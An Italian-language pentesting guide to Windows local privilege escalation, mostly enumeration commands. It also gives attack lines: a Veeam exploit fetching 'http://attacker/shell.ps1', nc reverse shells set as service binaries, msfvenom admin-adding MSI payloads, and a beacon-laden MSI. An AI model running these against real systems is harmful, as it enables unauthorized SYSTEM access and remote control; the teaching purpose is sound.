# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Teoria iniziale di Windows

### Access Tokens

**Se non sai cosa sono gli Access Tokens di Windows, leggi la seguente pagina prima di continuare:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Consulta la seguente pagina per maggiori informazioni sulle ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Se non sai cosa sono gli integrity levels in Windows, dovresti leggere la seguente pagina prima di continuare:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Controlli di sicurezza di Windows

In Windows esistono diversi elementi che potrebbero **impedirti di enumerare il sistema**, eseguire eseguibili o persino **rilevare le tue attività**. Dovresti **leggere** la seguente **pagina** ed **enumerare** tutti questi **meccanismi** di **difesa** prima di iniziare l'enumerazione per la privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Protezione dell'amministratore / silent elevation tramite UIAccess

I processi UIAccess avviati tramite `RAiLaunchAdminProcess` possono essere abusati per raggiungere High IL senza prompt quando i controlli secure-path di AppInfo vengono bypassati. Consulta qui il workflow dedicato per il bypass di UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

La propagazione del registro relativa all'accessibilità del Secure Desktop può essere abusata per eseguire una scrittura arbitraria nel registro come SYSTEM (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Le build recenti di Windows hanno inoltre introdotto un percorso LPE **SMB arbitrary-port**, in cui un'autenticazione NTLM locale privilegiata viene riflessa tramite una connessione TCP SMB riutilizzata:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informazioni di sistema

### Enumerazione delle informazioni sulla versione

Verifica se la versione di Windows presenta vulnerabilità note (controlla anche le patch applicate).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploit relativi alle versioni

Questo [sito](https://msrc.microsoft.com/update-guide/vulnerability) è utile per cercare informazioni dettagliate sulle vulnerabilità di sicurezza Microsoft. Questo database contiene più di 4.700 vulnerabilità di sicurezza e mostra la **massiccia superficie di attacco** esposta da un ambiente Windows.

**Sul sistema**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ha watson integrato)_

**Localmente, con le informazioni di sistema**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repository Github di exploit:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ambiente

Nelle variabili d'ambiente sono salvate informazioni relative a credenziali/Juicy?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Cronologia di PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### File di trascrizione PowerShell

Puoi scoprire come attivare questa funzionalità in [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/).
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

I dettagli delle esecuzioni della pipeline di PowerShell vengono registrati, includendo i comandi eseguiti, le invocazioni dei comandi e parti degli script. Tuttavia, i dettagli completi dell'esecuzione e i risultati dell'output potrebbero non essere acquisiti.

Per abilitarlo, segui le istruzioni nella sezione "Transcript files" della documentazione, selezionando **"Module Logging"** invece di **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Per visualizzare gli ultimi 15 eventi dai log di PowersShell, puoi eseguire:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Viene acquisito un record completo dell'attività e dell'intero contenuto dell'esecuzione dello script, garantendo che ogni blocco di codice venga documentato durante l'esecuzione. Questo processo conserva una traccia di audit completa di ogni attività, utile per la computer forensics e l'analisi dei comportamenti malevoli. Documentando tutte le attività al momento dell'esecuzione, vengono forniti dettagli approfonditi sul processo.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Gli eventi di logging per lo Script Block si trovano nel Visualizzatore eventi di Windows, nel percorso: **Registri applicazioni e servizi > Microsoft > Windows > PowerShell > Operational**.\
Per visualizzare gli ultimi 20 eventi, puoi usare:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Impostazioni Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Unità
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Puoi compromettere il sistema se gli aggiornamenti non vengono richiesti usando http**S**, ma http.

Inizia verificando se la rete utilizza un aggiornamento WSUS non-SSL eseguendo quanto segue in cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Oppure quanto segue in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Se ricevi una risposta come una di queste:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
E se `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` o `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` è uguale a `1`.

Allora, **è sfruttabile.** Se l'ultima chiave di registro è uguale a 0, la voce WSUS verrà ignorata.

Per sfruttare queste vulnerabilità puoi usare strumenti come: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Si tratta di exploit script MiTM weaponized per iniettare aggiornamenti "fake" nel traffico WSUS non-SSL.

Leggi la ricerca qui:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Leggi il report completo qui**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
In sostanza, questo è il flaw sfruttato dal bug:

> Se abbiamo il potere di modificare il proxy del nostro utente locale e Windows Updates utilizza il proxy configurato nelle impostazioni di Internet Explorer, abbiamo quindi il potere di eseguire [PyWSUS](https://github.com/GoSecure/pywsus) localmente per intercettare il nostro stesso traffico ed eseguire codice come utente elevato sul nostro asset.
>
> Inoltre, poiché il servizio WSUS utilizza le impostazioni dell'utente corrente, utilizzerà anche il suo certificate store. Se generiamo un certificato self-signed per l'hostname WSUS e aggiungiamo questo certificato al certificate store dell'utente corrente, saremo in grado di intercettare il traffico WSUS sia HTTP che HTTPS. WSUS non utilizza meccanismi simili a HSTS per implementare una validazione di tipo trust-on-first-use del certificato. Se il certificato presentato è trusted dall'utente e ha l'hostname corretto, verrà accettato dal servizio.

Puoi sfruttare questa vulnerabilità usando il tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (una volta che sarà liberato).

## Auto-Updaters di terze parti e Agent IPC (local privesc)

Molti agent enterprise espongono una superficie IPC su localhost e un canale di aggiornamento privilegiato. Se l'enrollment può essere forzato verso un server dell'attacker e l'updater si fida di una rogue root CA o di controlli deboli sul signer, un utente locale può fornire un MSI malevolo che il servizio SYSTEM installa. Vedi una tecnica generalizzata (basata sulla chain Netskope stAgentSvc – CVE-2025-0309) qui:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` espone un servizio su localhost alla porta **TCP/9401** che elabora messaggi controllati dall'attacker, consentendo l'esecuzione di comandi arbitrari come **NT AUTHORITY\SYSTEM**.

- **Recon**: conferma il listener e la versione, ad esempio `netstat -ano | findstr 9401` e `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: posiziona una PoC come `VeeamHax.exe` con le DLL Veeam richieste nella stessa directory, quindi attiva un payload SYSTEM tramite il socket locale:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Il servizio esegue il comando come SYSTEM.
## KrbRelayUp

Esiste una vulnerabilità di **local privilege escalation** negli ambienti **domain** Windows in condizioni specifiche. Queste condizioni includono ambienti in cui la firma **LDAP** non è obbligatoria, gli utenti dispongono di diritti propri che consentono loro di configurare la **Resource-Based Constrained Delegation (RBCD)** e gli utenti possono creare computer all'interno del dominio. È importante notare che questi **requisiti** sono soddisfatti utilizzando le impostazioni predefinite.

Trova l'**exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Per ulteriori informazioni sul flusso dell'attacco, consulta [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Se** queste 2 chiavi del Registro sono **abilitate** (il valore è **0x1**), gli utenti con qualsiasi livello di privilegio possono **installare** (eseguire) file `*.msi` come NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Se hai una sessione meterpreter, puoi automatizzare questa tecnica usando il modulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Usa il comando `Write-UserAddMSI` di power-up per creare nella directory corrente un file binario MSI di Windows per effettuare l'escalation dei privilegi. Questo script scrive un installer MSI precompilato che richiede l'aggiunta di un utente/gruppo (quindi sarà necessario l'accesso GIU):
```
Write-UserAddMSI
```
Esegui semplicemente il binary creato per fare privilege escalation.

### MSI Wrapper

Leggi questo tutorial per imparare a creare un MSI wrapper usando questi tools. Nota che puoi includere un file "**.bat**" se vuoi **solo** **eseguire** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Genera** con Cobalt Strike o Metasploit un **nuovo payload TCP EXE per Windows** in `C:\privesc\beacon.exe`
- Apri **Visual Studio**, seleziona **Create a new project** e inserisci "installer" nella casella di ricerca. Seleziona il progetto **Setup Wizard** e fai clic su **Next**.
- Assegna un nome al progetto, ad esempio **AlwaysPrivesc**, usa **`C:\privesc`** come percorso, seleziona **place solution and project in the same directory** e fai clic su **Create**.
- Continua a fare clic su **Next** fino ad arrivare al passaggio 3 di 4 (scelta dei file da includere). Fai clic su **Add** e seleziona il payload Beacon appena generato. Quindi fai clic su **Finish**.
- Seleziona il progetto **AlwaysPrivesc** nel **Solution Explorer** e, nelle **Properties**, modifica **TargetPlatform** da **x86** a **x64**.
- Puoi modificare anche altre properties, come **Author** e **Manufacturer**, per far sembrare l'app installata più legittima.
- Fai clic con il tasto destro sul progetto e seleziona **View > Custom Actions**.
- Fai clic con il tasto destro su **Install** e seleziona **Add Custom Action**.
- Fai doppio clic su **Application Folder**, seleziona il file **beacon.exe** e fai clic su **OK**. In questo modo il payload Beacon verrà eseguito non appena viene avviato l'installer.
- Nelle **Custom Action Properties**, modifica **Run64Bit** in **True**.
- Infine, **compila il progetto**.
- Se viene visualizzato l'avviso `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, assicurati di aver impostato la piattaforma su x64.

### MSI Installation

Per eseguire l'**installazione** del file `.msi` malevolo in **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Per sfruttare questa vulnerabilità puoi usare: _exploit/windows/local/always_install_elevated_

## Antivirus e rilevatori

### Impostazioni di audit

Queste impostazioni determinano cosa viene **registrato**, quindi dovresti prestare attenzione
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding: è interessante sapere dove vengono inviati i log
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** è progettato per la **gestione delle password degli Administrator locali**, assicurando che ogni password sia **unica, casuale e aggiornata regolarmente** sui computer aggiunti a un dominio. Queste password sono archiviate in modo sicuro all'interno di Active Directory e possono essere accessibili solo dagli utenti a cui sono state assegnate autorizzazioni sufficienti tramite ACL, consentendo loro di visualizzare le password degli admin locali se autorizzati.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Se attivo, le **password in chiaro vengono archiviate in LSASS** (Local Security Authority Subsystem Service).\
[**Maggiori informazioni su WDigest in questa pagina**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Protezione LSA

A partire da **Windows 8.1**, Microsoft ha introdotto una protezione avanzata per la Local Security Authority (LSA) per **bloccare** i tentativi dei processi non attendibili di **leggere la memoria** o iniettare codice, proteggendo ulteriormente il sistema.\
[**Maggiori informazioni sulla protezione LSA qui**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** è stato introdotto in **Windows 10**. Il suo scopo è proteggere le credenziali archiviate su un dispositivo da minacce come gli attacchi pass-the-hash.| [**Ulteriori informazioni su Credentials Guard qui.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Credenziali memorizzate nella cache

Le **credenziali di dominio** vengono autenticate dalla **Local Security Authority** (LSA) e utilizzate dai componenti del sistema operativo. Quando i dati di accesso di un utente vengono autenticati da un pacchetto di sicurezza registrato, le credenziali di dominio dell'utente vengono generalmente stabilite.\
[**Ulteriori informazioni sulle credenziali memorizzate nella cache**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Utenti e gruppi

### Enumerazione di utenti e gruppi

Dovresti verificare se alcuni dei gruppi di cui fai parte dispongono di permessi interessanti
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Gruppi privilegiati

Se **appartieni a un gruppo privilegiato potresti essere in grado di effettuare un'escalation dei privilegi**. Scopri di più sui gruppi privilegiati e su come abusarne per effettuare un'escalation dei privilegi qui:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipolazione dei token

**Scopri di più** su cosa sia un **token** in questa pagina: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Consulta la pagina seguente per **scoprire i token interessanti** e come abusarne:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Utenti con sessione attiva / Sessioni
```bash
qwinsta
klist sessions
```
### Cartelle home
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Criteri per le password
```bash
net accounts
```
### Ottieni il contenuto degli appunti
```bash
powershell -command "Get-Clipboard"
```
## Processi in esecuzione

### Permessi di file e cartelle

Prima di tutto, elencando i processi **controlla la presenza di password nella riga di comando del processo**.\
Controlla se puoi **sovrascrivere qualche binary in esecuzione** o se disponi di permessi di scrittura sulla cartella del binary per sfruttare possibili [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Controlla sempre la presenza di possibili [**electron/cef/chromium debuggers** in esecuzione: potresti sfruttarli per effettuare privilege escalation](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

**Verifica dei permessi dei binari dei processi**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Verifica delle autorizzazioni delle cartelle dei binari dei processi (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Estrazione di password dalla memoria

Puoi creare un dump della memoria di un processo in esecuzione usando **procdump** di sysinternals. Servizi come FTP hanno le **credenziali in testo in chiaro nella memoria**; prova a eseguire il dump della memoria e a leggere le credenziali.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Applicazioni GUI non sicure

**Le applicazioni in esecuzione come SYSTEM possono consentire a un utente di avviare un CMD o esplorare le directory.**

Esempio: "Windows Help and Support" (Windows + F1), cerca "command prompt", fai clic su "Click to open Command Prompt"

## Servizi

Service Triggers consentono a Windows di avviare un servizio quando si verificano determinate condizioni (attività su named pipe/endpoint RPC, eventi ETW, disponibilità IP, arrivo di un dispositivo, aggiornamento GPO, ecc.). Anche senza i diritti SERVICE_START, spesso è possibile avviare servizi privilegiati attivando i relativi trigger. Consulta qui le tecniche di enumerazione e attivazione:

-
{{#ref}}
service-triggers.md
{{#endref}}

Ottieni un elenco dei servizi:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permessi

Puoi usare **sc** per ottenere informazioni su un servizio
```bash
sc qc <service_name>
```
Si consiglia di avere il binario **accesschk** di _Sysinternals_ per verificare il livello di privilegi richiesto per ogni servizio.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Si consiglia di verificare se "Authenticated Users" può modificare qualche servizio:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Puoi scaricare accesschk.exe per XP da qui](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Abilitare il servizio

Se visualizzi questo errore (ad esempio con SSDPSRV):

_Errore di sistema 1058._\
_Impossibile avviare il servizio perché è disabilitato o perché non sono associati dispositivi abilitati._

Puoi abilitarlo usando
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Tieni conto che il servizio upnphost dipende da SSDPSRV per funzionare (per XP SP1)**

**Un'altra soluzione alternativa** a questo problema consiste nell'eseguire:
```
sc.exe config usosvc start= auto
```
### **Modificare il percorso del binario del servizio**

Nello scenario in cui il gruppo "Authenticated users" possiede **SERVICE_ALL_ACCESS** su un servizio, è possibile modificare il binario eseguibile del servizio. Per modificare ed eseguire **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Riavviare il servizio
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
I privilegi possono essere elevati tramite varie autorizzazioni:

- **SERVICE_CHANGE_CONFIG**: Consente la riconfigurazione del binario del servizio.
- **WRITE_DAC**: Consente di riconfigurare le autorizzazioni, permettendo di modificare le configurazioni del servizio.
- **WRITE_OWNER**: Permette di acquisire la proprietà e riconfigurare le autorizzazioni.
- **GENERIC_WRITE**: Include la possibilità di modificare le configurazioni del servizio.
- **GENERIC_ALL**: Include anch'esso la possibilità di modificare le configurazioni del servizio.

Per il rilevamento e lo sfruttamento di questa vulnerabilità, è possibile utilizzare _exploit/windows/local/service_permissions_.

### Autorizzazioni deboli dei binari dei servizi

Se un servizio viene eseguito come **`LocalSystem`**, **`LocalService`**, **`NetworkService`** o con un account di dominio privilegiato, ma gli utenti con privilegi bassi possono modificare l'EXE del servizio o la relativa cartella principale, spesso è possibile dirottare il servizio **sostituendo il binario e riavviando il servizio**.

**Verifica se puoi modificare il binario eseguito da un servizio** oppure se disponi di **autorizzazioni di scrittura sulla cartella** in cui si trova il binario ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Puoi ottenere ogni binario eseguito da un servizio usando **wmic** (non in system32) e verificare le tue autorizzazioni usando **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Puoi anche usare **sc** e **icacls**:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Cerca ACL pericolose assegnate a **`Everyone`**, **`BUILTIN\Users`** o **`Authenticated Users`**, in particolare **`(F)`**, **`(M)`** o **`(W)`** sull'eseguibile del servizio o sulla directory che lo contiene. Un flusso pratico di abuso è:

1. Conferma l'account del servizio e il percorso dell'eseguibile con `sc qc <service_name>`.
2. Conferma che il binary sia scrivibile con `icacls <path>`.
3. Sostituisci il binary del servizio con un payload o con un binary di servizio malevolo valido.
4. Riavvia il servizio con `sc stop <service_name> && sc start <service_name>` (oppure attendi un riavvio / un service trigger).

Controlli automatizzati utili:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Se il servizio non consente a un utente normale di riavviarlo, verifica se si avvia automaticamente all'avvio, dispone di un'azione in caso di errore che lo riavvia o può essere attivato indirettamente dall'applicazione che lo utilizza.

### Permessi di modifica del registro dei servizi

Dovresti verificare se puoi modificare il registro di qualche servizio.\
Puoi **verificare** i tuoi **permessi** su un **registro** di servizio eseguendo:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
È necessario verificare se **Authenticated Users** o **NT AUTHORITY\INTERACTIVE** dispongono delle autorizzazioni `FullControl`. In tal caso, il binary eseguito dal servizio può essere modificato.

Per modificare il Path del binary eseguito:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Alcune funzionalità di Accessibilità di Windows creano chiavi **ATConfig** per utente, che in seguito vengono copiate da un processo **SYSTEM** in una chiave di sessione HKLM. Una race con **symbolic link** nel registry può reindirizzare questa scrittura privilegiata verso **qualsiasi percorso HKLM**, fornendo una primitive di **value write** arbitraria in HKLM.

Posizioni chiave (esempio: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` elenca le funzionalità di accessibilità installate.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` memorizza la configurazione controllata dall'utente.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` viene creata durante il logon/le transizioni al secure desktop ed è scrivibile dall'utente.

Flusso di abuso (CVE-2026-24291 / ATConfig):

1. Popolare il valore **HKCU ATConfig** che si vuole venga scritto da SYSTEM.
2. Attivare la copia nel secure desktop (ad esempio **LockWorkstation**), avviando il flusso dell'AT broker.
3. **Vincere la race** impostando un **oplock** su `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; quando l'oplock scatta, sostituire la chiave **HKLM Session ATConfig** con un **registry link** verso un target HKLM protetto.
4. SYSTEM scrive il valore scelto dall'attaccante nel percorso HKLM reindirizzato.

Una volta ottenuta una **value write** arbitraria in HKLM, eseguire il pivot verso LPE sovrascrivendo i valori di configurazione dei servizi:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Scegliere un servizio che un utente normale possa avviare (ad esempio **`msiserver`**) e attivarlo dopo la scrittura. **Nota:** l'implementazione pubblica dell'exploit **blocca la workstation** come parte della race.

Strumenti di esempio (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Permessi AppendData/AddSubdirectory del registro dei servizi

Se disponi di questa autorizzazione su un registro, significa che **puoi creare sotto-registri a partire da questo**. Nel caso dei servizi Windows, questo è **sufficiente per eseguire codice arbitrario:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

